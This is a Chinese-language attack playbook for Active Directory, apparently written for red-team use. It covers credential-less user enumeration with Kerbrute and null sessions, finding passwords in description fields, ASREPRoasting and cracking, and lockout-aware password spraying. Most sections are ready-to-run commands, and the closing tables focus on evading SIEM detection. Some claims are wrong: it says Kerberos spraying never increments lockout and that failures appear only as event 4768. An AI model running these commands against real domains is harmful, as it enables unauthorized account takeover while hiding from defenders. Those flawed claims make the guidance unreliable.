# 喷洒前置: 无凭据用户枚举与情报收集

密码喷洒的成功率取决于两个输入: 准确的用户列表和高质量的候选密码。本文档覆盖在零凭据条件下获取这两项情报的全部手段。

---

## Kerbrute 用户枚举

Kerberos 协议对"用户存在"与"用户不存在"返回不同错误码 (`KDC_ERR_PREAUTH_REQUIRED` vs `KDC_ERR_C_PRINCIPAL_UNKNOWN`)，可据此判断账户是否存在。

### 基本用法

```bash
# 用户名字典枚举
kerbrute userenum --dc <DC_IP> -d <DOMAIN> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# 指定输出文件
kerbrute userenum --dc <DC_IP> -d <DOMAIN> users.txt -o valid_users.txt

# 通过代理执行
proxychains4 -q kerbrute userenum --dc <DC_IP> -d <DOMAIN> users.txt
```

### 提取有效用户名

```bash
kerbrute userenum --dc <DC_IP> -d <DOMAIN> users.txt 2>&1 \
  | grep "VALID" | awk '{print $7}' | cut -d'@' -f1 > valid_users.txt
```

### 隐蔽性优势

- 走 Kerberos 协议 (UDP/TCP 88)，不经过 SMB (TCP 445)
- 产生 **Event ID 4768** (TGT 请求)，不产生 **Event ID 4625** (登录失败)
- 大量 4768 事件在域环境中属于正常流量，不易触发告警
- 不触发账户锁定计数器

---

## Null Session 机制详解

### IPC$ 与 SAMR 协议

Windows 允许通过匿名连接到 `IPC$` (Inter-Process Communication) 共享，再经 SAMR (Security Account Manager Remote) 协议查询域信息。

```bash
# 测试 Null Session
netexec smb <DC_IP> -u '' -p ''

# 枚举用户 (注意检查 description 字段)
netexec smb <DC_IP> -u '' -p '' --users

# 获取密码策略 (喷洒前必须获取)
netexec smb <DC_IP> -u '' -p '' --pass-pol

# RID 枚举 (更完整的用户列表)
netexec smb <DC_IP> -u '' -p '' --rid-brute

# rpcclient 枚举
rpcclient -U '' -N <DC_IP>
# enumdomusers / enumdomgroups / queryuser <RID>
```

### Guest 账户 vs Null Session

| 特性 | Null Session | Guest 账户 |
|------|-------------|-----------|
| 身份 | 完全匿名 (ANONYMOUS LOGON) | Guest 用户 SID |
| 认证方式 | 空用户名 + 空密码 | `Guest` + 空密码 |
| 权限级别 | 最低，仅 SAMR 查询 | 稍高，可能访问共享 |
| 日志记录 | Event 4624 (Logon Type 3, Anonymous) | Event 4624 (Logon Type 3, Guest) |
| 默认状态 | Server 2016+ 默认禁用 | 通常禁用但偶有遗留 |

```bash
# 测试 Guest 账户
netexec smb <DC_IP> -u 'Guest' -p ''
```

### RestrictAnonymous 注册表影响

| 值 | 效果 |
|----|------|
| 0 | 允许匿名枚举 SAM 账户和共享 |
| 1 | 禁止匿名枚举 SAM 账户，但允许 SID 转换 |
| 2 | 完全禁止匿名访问 (最严格) |

现代域控通常设为 1 或 2，但遗留环境、DMZ 服务器、打印服务器等可能仍为 0。

### 检测事件

Null Session 枚举产生:
- **Event ID 4624**: 匿名登录成功 (Logon Type 3)
- **Event ID 4672**: 特权分配 (若有)
- 网络流量中可见 SAMR 请求

---

## 密码描述字段发现

管理员经常在用户 `description` 属性中嵌入初始密码或提示。

### 枚举方法

```bash
# Null Session 枚举 (检查描述字段)
netexec smb <DC_IP> -u '' -p '' --users
```

### 输出示例

```
SMB    10.10.10.10  445  DC01  [*] Enumerated 16 users
SMB    10.10.10.10  445  DC01  Administrator
SMB    10.10.10.10  445  DC01  svc_backup (BackupPass123)    <-- 密码在描述中
SMB    10.10.10.10  445  DC01  temp_user (Password: Welcome1!)
```

发现嵌入密码后应立即验证:

```bash
netexec smb <DC_IP> -u 'svc_backup' -p 'BackupPass123'
```

---

## 无凭据 ASREPRoasting

### 原理

禁用 Kerberos 预认证 (`DONT_REQ_PREAUTH`) 的用户，KDC 会直接返回用其密码加密的 TGT，攻击者可离线破解。

### 攻击方法

```bash
# 使用用户列表 (无需任何凭证)
impacket-GetNPUsers -dc-ip <DC_IP> '<DOMAIN>/' \
  -usersfile valid_users.txt -format hashcat -outputfile asrep_hashes.txt

# 不指定用户，自动查询 (需要 LDAP 匿名访问)
impacket-GetNPUsers -dc-ip <DC_IP> '<DOMAIN>/' -request

# 通过代理执行
proxychains4 -q impacket-GetNPUsers -dc-ip <DC_IP> '<DOMAIN>/' \
  -usersfile valid_users.txt -format hashcat
```

### Hash 格式

```
$krb5asrep$23$svc_backup@CORP.LOCAL:a8f2e...
```

### 破解

```bash
# Hashcat mode 18200 = Kerberos 5, etype 23, AS-REP
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# 使用规则加速
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
```

### 与 Kerberoasting 区别

| 特性 | ASREPRoasting | Kerberoasting |
|------|---------------|---------------|
| 目标 | 禁用预认证的用户 | 有 SPN 的服务账户 |
| 请求类型 | AS-REQ (TGT) | TGS-REQ (ST) |
| 需要认证 | 否 | 是 (需要有效 TGT) |
| Hashcat mode | 18200 | 13100 |

---

## 锁定感知喷洒策略

### 获取锁定策略

```bash
# 通过 Null Session
netexec smb <DC_IP> -u '' -p '' --pass-pol

# 通过 rpcclient
rpcclient -U '<USER>%<PASS>' <DC_IP> -c 'getdompwinfo'

# 通过 enum4linux
enum4linux -P <DC_IP>
```

关键参数:
```
Minimum password length: 7
Account lockout threshold: 5       <-- 5 次失败后锁定
Account lockout duration: 30 min
Reset lockout counter after: 30 min
```

### 安全喷洒原则

1. **留余量**: 锁定阈值 5 次 → 每个用户最多尝试 3-4 次
2. **等间隔**: 每次喷洒间隔 >= 计数器重置时间 (通常 30-35 分钟)
3. **分批处理**: 大用户列表拆分，轮流喷洒

```bash
# 分批
split -l 100 valid_users.txt batch_
```

### 候选密码模式

| 类型 | 示例 |
|------|------|
| 季节 + 年份 | `Summer2025!`, `Winter2025!`, `Spring2025!` |
| 公司名 + 年份 | `<Company>2025!`, `<Company>@123` |
| 通用弱密码 | `Welcome1`, `Password1`, `P@ssw0rd`, `Changeme1` |
| 键盘模式 | `Qwer1234!`, `Zaq1@wsx` |
| 用户名变体 | `john` -> `John123!` |

### 执行喷洒

```bash
# Kerbrute (推荐，更隐蔽)
kerbrute passwordspray --dc <DC_IP> -d <DOMAIN> valid_users.txt '<PASSWORD>'

# NetExec SMB
netexec smb <DC_IP> -u valid_users.txt -p '<PASSWORD>' --continue-on-success

# 添加延迟的 Kerbrute
kerbrute passwordspray --dc <DC_IP> -d <DOMAIN> valid_users.txt '<PASSWORD>' --delay 1000
```

---

## Kerbrute vs NetExec 对比

| 特性 | Kerbrute | NetExec (SMB) |
|------|----------|---------------|
| 协议 | Kerberos (88) | SMB (445) |
| 失败日志 | Event 4768 (TGT 请求) | Event 4625 (登录失败) |
| 锁定触发 | 不触发 | 触发 |
| 速度 | 快 (轻量协议) | 中等 |
| 隐蔽性 | 高 (4768 是正常流量) | 低 (4625 易被 SIEM 捕获) |
| 用户枚举 | 支持 (`userenum`) | 需要 Null Session |
| 适用场景 | 首选枚举和喷洒 | Null Session 可用时枚举更丰富 |
| 额外功能 | 仅枚举和喷洒 | 共享/策略/RID 枚举、命令执行 |

---

## 检测规避总结

| 行为 | SMB 认证 | Kerberos 认证 |
|------|----------|---------------|
| 登录失败 | Event 4625 | Event 4768 (正常流量) |
| 锁定计数 | 累加 | 不累加 |
| SIEM 告警 | 容易触发 (多个 4625) | 不易触发 |
| 网络特征 | TCP 445 | TCP/UDP 88 |

**最佳实践**: 优先使用 Kerbrute 进行用户枚举和密码喷洒，仅在需要丰富枚举信息 (共享、策略、描述字段) 时使用 NetExec Null Session。
